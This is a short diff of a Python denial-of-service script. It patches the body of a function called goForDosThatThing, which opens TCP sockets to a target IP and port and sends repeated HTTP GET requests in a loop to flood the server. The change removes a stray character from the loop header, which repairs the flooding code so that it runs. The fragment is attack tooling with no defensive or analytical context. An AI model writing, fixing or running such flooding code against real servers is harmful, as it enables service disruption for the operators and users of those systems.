@@ -55,7 +55,7 @@ def goForDosThatThing():
             dosSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             try:
                 dosSocket.connect((ip, port))
-                for i in range(speedPerRun): 1
+                for i in range(speedPerRun): 
                     try:
                         dosSocket.send(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"))
                         dosSocket.sendto(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"), (ip, port))
